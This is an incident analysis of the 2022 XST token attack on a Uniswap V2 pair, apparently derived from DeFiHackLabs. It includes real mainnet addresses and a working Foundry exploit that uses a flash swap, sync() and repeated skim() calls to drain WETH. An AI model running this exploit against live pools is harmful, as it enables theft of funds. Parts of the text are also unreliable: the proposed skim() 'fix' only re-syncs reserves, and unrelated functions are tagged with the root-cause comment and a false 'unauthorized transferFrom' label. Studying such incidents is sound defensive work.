# XST — skim() Repeated Reserve Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-08 |
| **Protocol** | XST Token (XStable) |
| **Chain** | Ethereum Mainnet |
| **Attack Tx** | [0x873f7c77d5489c1990f701e9bb312c103c5ebcdcf0a472db726730814bfd55f3](https://etherscan.io/tx/0x873f7c77d5489c1990f701e9bb312c103c5ebcdcf0a472db726730814bfd55f3) |
| **Vulnerable Contract (XST Token)** | [0x91383A15C391c142b80045D8b4730C1c37ac0378](https://etherscan.io/address/0x91383A15C391c142b80045D8b4730C1c37ac0378) |
| **XStable2** | [0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799](https://etherscan.io/address/0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799) |
| **WETH/XST Pair** | [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C](https://etherscan.io/address/0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C) |
| **WETH/USDT Pair** | [0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852](https://etherscan.io/address/0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **USDT** | [0xdAC17F958D2ee523a2206206994597C13D831ec7](https://etherscan.io/address/0xdAC17F958D2ee523a2206206994597C13D831ec7) |
| **Root Cause** | XST reserve manipulation via 15 repeated `skim()` calls on the WETH/XST pool, followed by a reverse swap |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/XST_exp.sol) |

---
## 1. Vulnerability Overview

The XST (XStable) token is a fee-on-transfer token with liquidity in a WETH/XST Uniswap V2 pair. The attacker flash-swapped approximately 2x the WETH reserve from the WETH/USDT pair and transferred it to the WETH/XST pair. They then acquired XST via `swap()`, reset the reserves via `sync()`, and repeatedly called `skim()` 15 times to exploit the reserve discrepancy caused by XST's fee-on-transfer mechanism, extracting additional XST with each call. Finally, the accumulated XST was reverse-swapped back to WETH to realize the profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ XST fee-on-transfer and skim() interaction vulnerability
// Fee handling in XST._transfer()
function _transfer(address sender, address recipient, uint256 amount) internal override {
    uint256 fee = amount * feeRate / 1000;
    uint256 netAmount = amount - fee;

    super._transfer(sender, feeWallet, fee);
    super._transfer(sender, recipient, netAmount);
    // ❌ Result: actual amount deposited to pair = netAmount < amount
    //    pair's balanceOf(xst) > reserve(xst) state persists
    //    → discrepancy can be repeatedly extracted via skim()
}

// Uniswap V2 pair's skim() - standard
function skim(address to) external {
    // ❌ fee-on-transfer tokens create a new discrepancy on every skim() call
    uint256 excess0 = balance0 - reserve0;
    uint256 excess1 = balance1 - reserve1;
    // Transfer excess → but XST fee-on-transfer causes
    // a new fee during the transfer → creating yet another discrepancy
    IERC20(token0).transfer(to, excess0);
    IERC20(token1).transfer(to, excess1);
    // ✅ This is why the call can be repeated
}

// ✅ Fix: handle fee-on-transfer tokens in skim()
function skim(address to) external nonReentrant {
    // Calculate based on actual balances
    uint256 balance0 = IERC20(token0).balanceOf(address(this));
    uint256 balance1 = IERC20(token1).balanceOf(address(this));
    // Update reserves with actual received amounts, accounting for fee-on-transfer
    _update(balance0, balance1, reserve0, reserve1);
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**XST2.sol** — Entry point:
```solidity
// ❌ Root cause: XST reserve manipulation via 15 repeated `skim()` calls on the WETH/XST pool, followed by a reverse swap
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {  // ❌ unauthorized transferFrom
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), getAllowances(sender,_msgSender()).sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
```

**AddressUpgradeable.sol** — Related contract:
```solidity
// ❌ Root cause: XST reserve manipulation via 15 repeated `skim()` calls on the WETH/XST pool, followed by a reverse swap
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] WETH/USDT.swap(2x WETH_reserve) → flash swap borrow
    │       uniswapV2Call() callback entered
    │
    ├─[2] Transfer WETH to WETH/XST pair
    │
    ├─[3] WETH/XST.swap(0, XST_reserve * 50%) → acquire XST
    │
    ├─[4] WETH/XST.sync() → reset reserves to current balances
    │
    ├─[5] Partially transfer held XST to WETH/XST pair
    │
    ├─[6] skim() × 15 iterations
    │       └─ Each call:
    │           ├─ Reserve discrepancy created by XST fee-on-transfer
    │           └─ Excess XST extracted to attacker
    │
    ├─[7] Accumulated XST → reverse swap to WETH
    │
    └─[8] Repay flash swap, net WETH profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IUni_Pair_V2 {
    function swap(uint256, uint256, address, bytes calldata) external;
    function skim(address) external;
    function sync() external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract XSTExploit is Test {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 XST = IERC20(0x91383A15C391c142b80045D8b4730C1c37ac0378);
    IUni_Pair_V2 pair694f = IUni_Pair_V2(0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C); // WETH/XST
    IUni_Pair_V2 pair0d4a = IUni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852); // WETH/USDT

    function setUp() public {
        vm.createSelectFork("mainnet", 15_310_016);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WETH balance", WETH.balanceOf(address(this)), 18);

        // [Step 1] Query WETH balance of WETH/XST pair
        (uint112 r0, , ) = pair694f.getReserves(); // r0 = WETH reserve

        // [Step 2] Flash swap 2x WETH from WETH/USDT pair
        pair0d4a.swap(r0 * 2, 0, address(this), abi.encode("exploit"));

        emit log_named_decimal_uint("[End] WETH balance", WETH.balanceOf(address(this)), 18);
        WETH.transfer(msg.sender, WETH.balanceOf(address(this)));
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        // [Step 3] Transfer borrowed WETH to WETH/XST pair and swap
        WETH.transfer(address(pair694f), amount0 / 2);
        (, uint112 r1, ) = pair694f.getReserves(); // r1 = XST reserve
        pair694f.swap(0, uint256(r1) * 50 / 100, address(this), ""); // acquire XST

        // [Step 4] Reset reserves via sync()
        pair694f.sync();

        // [Step 5] Transfer half of held XST to the pair
        XST.transfer(address(pair694f), XST.balanceOf(address(this)) / 2);

        // [Step 6] skim() 15 iterations — exploit XST fee-on-transfer discrepancy
        for (uint256 i = 0; i < 15; i++) {
            pair694f.skim(address(this)); // ⚡ extract excess XST on every call
        }

        // [Step 7] Accumulated XST → reverse swap to WETH
        uint256 xstBalance = XST.balanceOf(address(this));
        XST.transfer(address(pair694f), xstBalance);
        pair694f.swap(r0 * 99 / 100, 0, address(this), "");

        // Repay flash swap
        uint256 repay = amount0 * 1003 / 1000 + 1;
        WETH.transfer(address(pair0d4a), repay);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Fee-on-transfer + repeated skim() reserve manipulation |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve discrepancy exploitation |
| **Attack Vector** | Repeated skim() calls on a fee-on-transfer token |
| **Precondition** | Fee-on-transfer token present in a Uniswap V2 pool |
| **Impact** | WETH drained (exact amount unconfirmed) |

---
## 6. Remediation Recommendations

1. **Disable skim()**: Disable or restrict access to the `skim()` function in pools that contain fee-on-transfer tokens.
2. **Automatic reserve synchronization**: Automatically update reserves after each transfer to minimize discrepancies between balances and reserves.
3. **Fee-on-transfer detection**: Detect whether a token is fee-on-transfer at pool creation time and apply the appropriate logic accordingly.

---
## 7. Lessons Learned

- **Unintended repeatability of skim()**: Uniswap V2's `skim()` is a simple utility function, but when combined with fee-on-transfer tokens it becomes a repeatable profit-extraction mechanism.
- **AMM risks of fee-on-transfer tokens**: Such tokens create numerous edge cases that are incompatible with standard AMMs. Non-standard token mechanics require thorough analysis before integration into an AMM.